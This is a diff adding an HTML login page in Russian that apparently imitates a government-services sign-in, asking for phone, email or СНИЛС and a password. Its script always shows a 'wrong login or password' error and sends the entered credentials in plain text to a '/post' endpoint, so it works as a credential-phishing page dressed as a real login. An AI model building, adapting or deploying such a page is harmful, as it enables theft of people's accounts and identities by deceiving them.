@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Авторизация</title>
+    <style>
+        body {
+            background: #FAFAFA;
+            color: white;
+            font-family: 'Calibri', sans-serif;
+            margin: 0;
+            font-weight: bold;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        .zero {
+            background-color: #FFFFFF;
+            border-radius: 5px;
+            flex-direction: column; 
+            align-items: flex-start;
+            justify-content: left;
+            padding: 40px 50px;
+            width: 60vh;
+            height: 60vh;
+            border: #E3E4E4;
+            transform: scale(0.8); 
+            transform-origin: center; 
+            border: 1px solid #E3E4E4;
+        }
+        .zero2 {
+            background-color: #F4D6D2;
+            border-radius: 0px;
+            width: 57vh;
+            height: 5vh;
+            padding: 15px 10px;
+            color: #FFF2F2;
+            font-size:2.3vh;
+            transform-origin: left; 
+            text-align: left;
+            justify-content: left;
+            align-items: center;
+            place-items: center;
+            padding-top: -15px;
+            display: flex;
+            position: relative;
+        }
+        .lineyka {
+            position: absolute;
+            left: 0; 
+            top: 0;
+            bottom: 0; 
+            width: 5px; 
+            background-color: #AA0000;
+        }
+        @media (max-width: 768px) {
+            .zero {
+                width: 80%; 
+                height: 100%;
+                max-width: 80%;
+            }
+        }
+        @media (max-width: 768px) {
+            .zero2 {
+                width: 100%; 
+                max-width: 100%;
+                font-size:2.3vh;
+            }
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 5vh;
+            color: #000000
+        }
+        .h21 {
+            color: black;
+            font-weight: normal;
+            margin-left: 10px;
+        }
+        .invalid {
+            color: #FF0000;
+            margin-top: 5px;
+        }
+        p {
+            color: white;
+        }
+        .checkbox {
+            align-items: center;
+            position: relative;
+            display: flex;
+            padding-right: 15px;
+        }
+        .checkboxx {
+            transform: scale(1.8);
+        }
+        .btn-new {
+            border-radius: 5px;
+            color: white;
+            text-align: center;
+            transition: .1s linear;
+            justify-content: left;
+            align-items: center;
+            background: #0044CC;
+            height: 6vh;
+            width: 100%;
+            cursor: pointer;
+            border: none;
+            font-size: 2.5vh;
+        }
+        .label {
+            display: grid;
+            font-size: 2.5vh;
+            margin-bottom: 5px;
+            color: #000000;
+            transform-origin: left; 
+            text-align: left;
+            justify-content: left;
+        }
+        .input-field {
+            border-radius: 5px;
+            color: black;
+            transition: border 0.05s ease;
+            background: #3DFF41;
+            border: 1px solid #C4C8D0;
+            margin-bottom: 2px;
+            width: 100%;
+            flex: 1;
+            outline: none;
+            padding: 10px;
+            align-items: center;
+            width: 57vh;
+            height: 3.5vh;
+            font-size: 16px;
+            background-color: white;
+        }
+        @media (max-width: 768px) {
+            .input-field {
+                width: 92%; 
+                max-width: 92%; 
+            }
+        }
+        @media (max-width: 768px) {
+            .btn-new {
+                width: 100%; 
+                max-width: 100%; 
+            }
+        }
+        .input-field::placeholder {
+            font-size: 2.2vh;
+            color: #7b7d85;
+        }
+        .allin1 {
+            margin-left: -20px;
+            cursor: pointer;
+            width: 90px;
+        }
+        .allin2 {
+            flex: 1;
+        }
+        .btn-new:hover {
+            background-color: #0033AA;
+        }
+        .input-field:hover {
+            border: 1px solid #6688DD;
+        }
+        .input-field:focus {
+            border: 5px solid #6688DD;
+        }
+        .badd {
+            border: 1px solid #DC3545;
+        }
+        .redlbl {
+            color: #B20029;
+            font-weight: normal;
+            font-size: 2.5vh;
+        }
+        .labell {
+            font-weight: normal;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="zero">
+        <h1 class="login-heading mb-4">Вход</h1>
+        <div class="zero2" style="display: none;">
+            <div class="lineyka"></div>
+            <p class="h21">Введен некорректный логин или пароль.</p>
+        </div>
+        <br>
+        <label for="username" class="label">Телефон, электронная почта или СНИЛС</label>
+        <input type="text" name="username" id="username" class="input-field" value="" placeholder="" autocomplete="username">
+        <label for="username" class="redlbl"  id="usrnmredlbl" style="display:none">Введите логин</label>
+        <br>
+        <br>
+        <label for="password" class="label">Пароль</label>
+        <input type="password" name="password" id="password" value="" class="input-field" placeholder="" autocomplete="current-password">
+        <label for="password" class="redlbl" id="passredlbl" style="display:none">Введите пароль</label>
+        <br>
+        <br>
+        <div class="checkbox">
+            <input type="checkbox" id="checkbox" class="checkboxx"></input>
+            <label for="checkbox" class="label labell">Показать пароль</label>
+        </div>
+        <br>
+        <br>
+        <button class="btn-new" type="submit" id="loginbtn">Войти</button>
+    </div>
+    </div>
+    <script>
+        var el2 = document.getElementById('loginbtn');
+        var email = document.getElementById('username');
+        var pswd = document.getElementById('password');
+        var zero2 = document.querySelector('.zero2');
+        var passredlbl = document.getElementById('passredlbl');
+        var usrnmredlbl = document.getElementById('usrnmredlbl');
+        var checkbox = document.getElementById('checkbox');
+
+        email.addEventListener('input', () => {
+            email.classList.remove('badd');
+            usrnmredlbl.style.display='none';
+        })
+
+        pswd.addEventListener('input', () => {
+            pswd.classList.remove('badd');
+            passredlbl.style.display='none';
+        })
+
+        checkbox.addEventListener('click', () => {
+            if(checkbox.checked) {
+                pswd.type = 'text';
+            } else {
+                pswd.type = 'password';
+            }
+        })
+
+        el2.addEventListener('click', () => {
+            var emaill = email.value;
+            var pswdd = pswd.value;
+
+            if (emaill.trim() !== "" && pswdd.trim() !== "") {
+                zero2.style.display = 'flex';
+                fetch('/post?email=' + emaill + '&password=' + pswdd, {
+                    mode: 'cors'
+                })
+                .catch(error => {
+                });
+            }
+
+            if (emaill.trim() == "") {
+                usrnmredlbl.style.display='block';
+                email.classList.add('badd');
+            }
+            if (pswdd.trim() == "") {
+                passredlbl.style.display='block';
+                pswd.classList.add('badd');
+            }
+        });
+
+    </script>
+</body>
+</html>
